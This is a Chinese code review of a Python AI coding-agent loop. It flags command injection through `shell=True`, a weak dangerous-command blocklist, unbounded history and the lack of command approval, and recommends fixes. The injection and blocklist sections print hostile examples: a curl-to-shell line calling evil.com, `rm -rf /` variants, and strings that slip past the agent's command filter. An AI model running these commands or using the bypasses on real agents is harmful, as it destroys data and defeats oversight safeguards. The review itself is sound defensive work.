# 代码审查：`agents/s01_agent_loop.py`

> 审查日期：2025-07-11
> 审查文件：`agents/s01_agent_loop.py`

---

## 概述

基于 Anthropic API 实现的 AI 编程 Agent 循环，代码结构清晰、设计良好。中断处理机制相当成熟，整体架构合理。但存在**严重的安全隐患**（集中在命令执行部分）以及若干正确性问题需要关注。

---

## 严重问题

### 1. `shell=True` 导致命令注入（第 72 行）

```python
r = subprocess.run(command, shell=True, cwd=os.getcwd(), ...)
```

- **影响**：`shell=True` 会将命令字符串传递给 `/bin/sh -c` 执行，这意味着模型生成的输出如 `echo hello && curl evil.com | sh` 或 `cmd1; cmd2` 可以执行任意 shell 构造。第 65-67 行的「危险命令」过滤器极易被绕过（例如 `rm --recursive --force /`、`$(rm -rf /)`、`cmd$(reverse-shell)`、换行注入等）。
- **修复**：改用 `shell=False` 配合参数列表，或至少使用 `shlex.split()`。更理想的方案是将执行环境沙箱化（容器/虚拟机）：

```python
import shlex
r = subprocess.run(shlex.split(command), shell=False, ...)
```

### 2. 脆弱的危险命令过滤器（第 65-67 行）

```python
dangerous = ["rm -rf /", "sudo", "shutdown", "reboot", "> /dev/"]
if any(d in command for d in dangerous):
```

- **影响**：子串匹配非常脆弱 — `rm -rf /var/log` 会被误拦截（误报），而 `sudo$(echo)`、`rm  -rf  /`、`shut\down` 均能绕过。`> /dev/` 模式也过于宽泛（会误触发 `> /dev/null` 等合法重定向）。
- **修复**：要么使用合适的命令白名单，要么彻底沙箱化执行环境。基于黑名单的安全策略本质上不可靠。

### 3. 对话历史无限增长（第 178 行）

```python
history.append({"role": "user", "content": query})
# ... agent_loop 继续追加更多消息
```

- **影响**：`history` 随每轮对话无限增长。工具执行结果（每条最多 50KB）不断累积，最终会耗尽上下文窗口或导致 API 报错。
- **修复**：实现上下文窗口管理 — 裁剪最早的消息、做摘要压缩，或使用滑动窗口。

---

## 改进建议

### 4. 错位的注释块（第 131-135 行）

`_watch_esc_windows` 的文档注释被放在了方法体之外（`_watch_esc` 和 `_watch_esc_windows` 之间），并且尾部有乱码字符（`───────────────────────────────────────────`）。这很可能是粘贴残留，影响代码可读性。

- **修复**：将该注释移入 `_watch_esc_windows` 方法内部作为正式 docstring，删除乱码行。

### 5. 缺少瞬时故障重试机制

`stream_llm` 和 `run_bash` 均无针对网络错误、限流（429）或瞬时 API 故障的重试逻辑。一次偶发抖动就会导致整个对话崩溃。

- **修复**：添加指数退避重试（尤其是 429/5xx），最大重试次数设为 3-5 次。

### 6. 超时时间硬编码（第 73 行）

```python
timeout=120
```

所有命令共用同一个 120 秒超时。合法的长时间操作（如 `pip install`、`git clone`）会超时失败，且用户无法自定义。

- **修复**：使超时时间可按命令配置，或允许模型将其作为工具参数传入。

### 7. stdout/stderr 混在一起（第 74 行）

```python
out = (r.stdout + r.stderr).strip()
```

将 stdout 和 stderr 合并后，模型无法区分正常输出和错误信息，可能被误导。

- **修复**：在工具结果中将两者分开返回，或至少添加 `[stderr]` 前缀标识。

### 8. 缺少命令审批/沙箱模式

模型生成的每条命令都会立即执行，无需用户确认。对于编程 Agent 来说风险极高 — 模型可以执行 `pip uninstall`、删除项目文件或泄露数据。

- **修复**：添加 `--approve` 模式，在每次 `bash` 执行前提示用户确认，类似 Claude Code 的工作方式。

### 9. `response.content` 序列化风险（第 116 行）

```python
messages.append({"role": "assistant", "content": response.content})
```

`response.content` 是 Anthropic SDK 的内部类型（`ContentBlock` 对象列表）。虽然 SDK 在下一次 API 调用时可能会正确序列化它，但这很脆弱 — 一旦结构变化或需要序列化/反序列化历史记录，就会出问题。

- **修复**：显式转换为纯 dict/list 结构，或使用 `response.model_dump()`。

### 10. 中断轮次缺少工具定义（第 109-111 行）

触发中断后，仅追加纯文本 `[Interrupted by user]`。如果模型当时正在执行工具调用，下一轮上下文中该消息不包含任何工具定义，可能让模型感到困惑。此问题影响较小，但值得注意。

---

## 亮点

- **出色的中断处理**：`InterruptController` 配合后台线程、流关闭和 `ModelInterrupted` 信号，设计成熟，能正确跨平台（Windows/POSIX）处理 Esc 和 Ctrl+C。上下文管理器模式干净利落。
- **良好的终端适配**：`readline` 配置包含 macOS 的 UTF-8 退格修复，`cbreak` 模式配合 `finally` 中正确恢复 `termios` 设置 — 这些细节对 CLI 工具至关重要。
- **架构清晰**：循环模式（`while stop_reason == "tool_use"`）文档清晰、实现到位。`stream_llm`、`run_bash`、`agent_loop` 的职责划分明确。
- **UX 细节用心**：ANSI 颜色区分提示符和命令，输出截断（显示 200 字符，传模型 50KB），历史中标记 `[Interrupted by user]`。
- **防御式 `os.getcwd()` 用法**：统一使用 `cwd=os.getcwd()` 而非依赖隐式当前目录，避免了 chdir 相关的 bug。

---

## 结论

- [ ] 可直接合入
- [x] **需要少量修改** — `shell=True` 是阻塞性问题。修复此项、清理错位注释块、添加重试逻辑后即可合入。其余属于锦上添花的改进，可逐步迭代。

---

## 建议修复优先级

| 优先级 | 问题 | 预计工时 |
|--------|------|----------|
| **P0** | 将 `shell=True` 替换为 `shell=False` + `shlex.split()` | 5 分钟 |
| **P1** | 移除/重写脆弱的危险命令黑名单 | 5 分钟 |
| **P1** | 修复错位注释块（第 131-135 行） | 1 分钟 |
| **P2** | 添加瞬时 API 故障重试逻辑 | 15 分钟 |
| **P2** | 实现上下文窗口截断 | 30 分钟 |
| **P3** | 添加 `--approve` 命令审批模式 | 1 小时 |
